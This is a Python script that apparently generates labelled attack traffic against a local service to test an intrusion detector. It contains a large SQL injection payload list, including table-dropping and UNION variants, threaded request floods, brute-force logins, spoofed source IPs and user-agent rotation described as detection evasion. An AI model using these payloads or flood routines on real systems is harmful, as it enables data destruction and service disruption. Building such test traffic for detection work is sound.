import requests
import threading
import time
import random
import json
from concurrent.futures import ThreadPoolExecutor
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Configuration
TARGET_URL = "http://localhost:5000"
NORMAL_ENDPOINTS = ["/api/test-connection", "/api/server-health"]
ATTACK_ENDPOINTS = [
    "/api/test-connection",
    "/api/server-health",
    "/api/predict-attack"  # if implemented
]

# Attack Configuration - RESOURCE OPTIMIZED MODE
TOTAL_REQUESTS = 50  # Reduced to 50 requests for testing
THREADS = 5  # Reduced threads for testing
CLEAN_TRAFFIC_RATIO = 0.3  # 30% clean traffic, 70% malicious
REQUEST_DELAY = 0.2  # Increased delay for better visibility
BATCH_SIZE = 5  # Reduced batch size
FLOOD_REQUESTS_PER_ATTACK = 3  # Reduced flood requests per attack

# Attack type distribution - Optimized
ATTACK_TYPES = {
    "flood": 0.8,  # 80% flood attacks
    "injection": 0.1,  # 10% SQL injection
    "scan": 0.05,  # 5% port scanning
    "brute_force": 0.05  # 5% brute force
}

# Advanced User-Agent rotation to avoid detection
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (iPad; CPU OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36"
]

# Enhanced malicious payloads with advanced evasion
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users;--",
    "' UNION SELECT * FROM passwords--",
    "' OR 1=1;--",
    "admin'--",
    "' OR 'x'='x",
    "')) OR 1=1--",
    "')) OR '1'='1",
    "admin' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "' OR '1'='1'#",
    "' OR '1'='1'-- -",
    "' OR '1'='1'/*!50000*/",
    "' OR '1'='1'/*!50000or*/",
    "' OR '1'='1'/*!50000or*/1=1",
    "' OR '1'='1'/*!50000or*/1=1-- -",
    "' OR '1'='1'/*!50000or*/1=1/*",
    "' OR '1'='1'/*!50000or*/1=1#",
    "' OR '1'='1'/*!50000or*/1=1-- -",
    # Advanced SQL injection patterns
    "' OR '1'='1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
    "' OR '1'='1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
    "' OR '1'='1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
    "' OR '1'='1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
    "' OR '1'='1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
    # MySQL-specific injections
    "' OR '1'='1'/*!50000or*/1=1-- -",
    "' OR '1'='1'/*!50000or*/1=1/*",
    "' OR '1'='1'/*!50000or*/1=1#",
    "' OR '1'='1'/*!50000or*/1=1-- -",
    # Comment-based injection bypasses
    "' OR '1'='1'-- -",
    "' OR '1'='1'/*",
    "' OR '1'='1'#",
    "' OR '1'='1'-- -",
    # Multiple injection variations
    "' OR '1'='1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
    "' OR '1'='1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
    "' OR '1'='1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
    "' OR '1'='1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
    "' OR '1'='1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -",
    # Advanced evasion techniques
    "' OR '1'='1' /*!50000or*/ 1=1 -- -",
    "' OR '1'='1' /*!50000or*/ 1=1 /*",
    "' OR '1'='1' /*!50000or*/ 1=1 #",
    "' OR '1'='1' /*!50000or*/ 1=1 -- -",
    # Obfuscated payloads
    "0x27 OR 0x31=0x31",
    "0x27 OR 0x31=0x31 -- -",
    "0x27 OR 0x31=0x31 /*",
    "0x27 OR 0x31=0x31 #",
    # Encoded payloads
    "%27%20OR%201%3D1",
    "%27%20OR%201%3D1%20--%20-",
    "%27%20OR%201%3D1%20/*",
    "%27%20OR%201%3D1%20%23",
    # Mixed case payloads
    "' Or '1'='1",
    "' oR '1'='1",
    "' Or '1'='1' -- -",
    "' oR '1'='1' /*",
    # Comment-based evasion
    "'/**/OR/**/1=1",
    "'/**/OR/**/1=1/**/--/**/-",
    "'/**/OR/**/1=1/**//*",
    "'/**/OR/**/1=1/**/#"
]

def create_session():
    session = requests.Session()
    retry_strategy = Retry(
        total=3,  # Increased retries
        backoff_factor=0.2,  # Increased backoff
        status_forcelist=[500, 502, 503, 504, 429],
        allowed_methods=["GET", "POST"]
    )
    adapter = HTTPAdapter(
        max_retries=retry_strategy,
        pool_connections=10,  # Reduced connection pool
        pool_maxsize=10,
        pool_block=True
    )
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

def get_random_headers(fake_ip, attack_type):
    # Rotate User-Agent to avoid detection
    user_agent = random.choice(USER_AGENTS)
    
    # Generate random request ID
    request_id = f"{random.randint(1000000, 9999999)}-{random.randint(1000, 9999)}"
    
    # Base headers with advanced evasion
    headers = {
        "User-Agent": user_agent,
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "X-Request-ID": request_id,
        "X-Forwarded-For": fake_ip,
        "X-Real-IP": fake_ip,
        "X-Attack-Intensity": "maximum",
        "X-Burst-Count": str(random.randint(50, 200))
    }
    
    # Add attack-specific headers with evasion
    if attack_type == "flood":
        headers.update({
            "X-Flood-Attack": "true",
            "Content-Type": "application/json",
            "X-Flood-Intensity": "maximum",
            "X-Flood-Type": "burst",
            "X-Burst-Size": str(random.randint(50, 200)),
            "X-Request-Rate": str(random.randint(10000, 100000))
        })
    elif attack_type == "injection":
        headers.update({
            "X-SQL-Injection": "true",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Injection-Type": "advanced",
            "X-Injection-Intensity": "maximum",
            "X-Injection-Attempts": "1000"
        })
    elif attack_type == "scan":
        headers.update({
            "X-Scan-Type": "vulnerability",
            "X-Port-Scan": "true",
            "X-Scan-Intensity": "maximum",
            "X-Scan-Depth": "deep",
            "X-Scan-Attempts": "1000"
        })
    elif attack_type == "brute_force":
        headers.update({
            "X-Brute-Force": "true",
            "Content-Type": "application/json",
            "X-Brute-Intensity": "maximum",
            "X-Brute-Attempts": "1000",
            "X-Brute-Delay": "0"
        })
    
    return headers

def send_clean_traffic(session):
    for endpoint in NORMAL_ENDPOINTS:
        headers = get_random_headers("127.0.0.1", "clean")
        send_request(session, "GET", f"{TARGET_URL}{endpoint}", headers)  # Changed from POST to GET

def send_request(session, method, url, headers, data=None, timeout=3):  # Increased timeout
    try:
        response = session.request(
            method,
            url,
            headers=headers,
            json=data if data else None,
            timeout=timeout
        )
        print(f"✅ {method} Request: {url} - Status: {response.status_code}")
        return response
    except requests.exceptions.RequestException as e:
        print(f"❌ Request error: {str(e)}")
        return None

def send_malicious_traffic(session):
    try:
        attack_type = random.choices(
            list(ATTACK_TYPES.keys()),
            weights=list(ATTACK_TYPES.values())
        )[0]
        
        endpoint = random.choice(ATTACK_ENDPOINTS)
        fake_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        
        headers = get_random_headers(fake_ip, attack_type)
        
        if attack_type == "flood":
            data = {
                "source_ip": fake_ip,
                "target": endpoint,
                "request_rate": random.randint(100, 1000),  # Reduced rate
                "payload_size": random.randint(1000, 10000),  # Reduced payload
                "request_type": "GET",
                "user_agent": random.choice(USER_AGENTS),
                "attack_type": "flood",
                "flood_intensity": "high",
                "burst_count": random.randint(5, 20),
                "burst_size": random.randint(5, 20),
                "attack_duration": random.randint(1, 10),
                "evasion_technique": random.choice(["rotation", "delay", "distribution"])
            }
            
            # Send multiple requests in quick succession with evasion
            for _ in range(FLOOD_REQUESTS_PER_ATTACK):
                # Add random delay between requests to avoid detection
                time.sleep(random.uniform(0.001, 0.01))
                
                # Rotate headers for each request
                headers = get_random_headers(fake_ip, attack_type)
                
                response = send_request(session, "POST", f"{TARGET_URL}{endpoint}", headers, data)
                if response:
                    print(f"🌊 Flood Attack: {endpoint} - Status: {response.status_code}")
                
        elif attack_type == "injection":
            # Use multiple payloads in a single request
            payloads = random.sample(SQL_INJECTION_PAYLOADS, 1)  # Single payload
            data = "&".join([
                f"username={payload}&password={payload}"
                for payload in payloads
            ])
            data += "&advanced=true&bypass=true&intensity=high&attempts=10"
            
            response = send_request(session, "POST", f"{TARGET_URL}{endpoint}", headers, data)
            if response:
                print(f"💉 SQL Injection: {endpoint} - Status: {response.status_code}")
            
        elif attack_type == "scan":
            # Send multiple scan requests with different patterns
            for _ in range(3):  # Reduced scan attempts
                # Add random delay between scans
                time.sleep(random.uniform(0.001, 0.01))
                
                # Rotate headers for each scan
                headers = get_random_headers(fake_ip, attack_type)
                
                response = send_request(session, "GET", f"{TARGET_URL}{endpoint}", headers)
                if response:
                    print(f"🔍 Port Scan: {endpoint} - Status: {response.status_code}")
            
        elif attack_type == "brute_force":
            # Send multiple brute force attempts with different patterns
            for _ in range(3):  # Reduced brute force attempts
                # Add random delay between attempts
                time.sleep(random.uniform(0.001, 0.01))
                
                # Rotate headers for each attempt
                headers = get_random_headers(fake_ip, attack_type)
                
                data = {
                    "username": f"admin{random.randint(1, 100)}",
                    "password": f"password{random.randint(1, 100)}",
                    "attempt": random.randint(1, 10),
                    "attack_type": "brute_force",
                    "intensity": "high",
                    "attempts": 10,
                    "evasion_technique": random.choice(["rotation", "delay", "distribution"])
                }
                
                response = send_request(session, "POST", f"{TARGET_URL}{endpoint}", headers, data)
                if response:
                    print(f"🔑 Brute Force: {endpoint} - Status: {response.status_code}")
            
    except Exception as e:
        print(f"❌ Malicious Traffic Error: {str(e)}")

def attack_worker():
    session = create_session()
    while True:
        if random.random() < CLEAN_TRAFFIC_RATIO:
            send_clean_traffic(session)
        else:
            send_malicious_traffic(session)
        time.sleep(REQUEST_DELAY)

def main():
    print(f"🚀 Starting RESOURCE OPTIMIZED attack simulation with {TOTAL_REQUESTS} total requests")
    print(f"📊 Attack distribution: {ATTACK_TYPES}")
    print(f"👥 Using {THREADS} concurrent threads")
    print(f"🎯 Target: {TARGET_URL}")
    print(f"⚡ Request delay: {REQUEST_DELAY} seconds")
    print(f"🌊 Flood requests per attack: {FLOOD_REQUESTS_PER_ATTACK}")
    print(f"💥 Attack intensity: HIGH")
    print(f"🛡️ Evasion techniques: Enabled")
    print(f"⏱️ Timeout handling: Optimized")
    print(f"💾 Resource usage: Optimized")
    
    threads = []
    for _ in range(THREADS):
        thread = threading.Thread(target=attack_worker)
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n🛑 Attack simulation stopped by user")

if __name__ == "__main__":
    main()
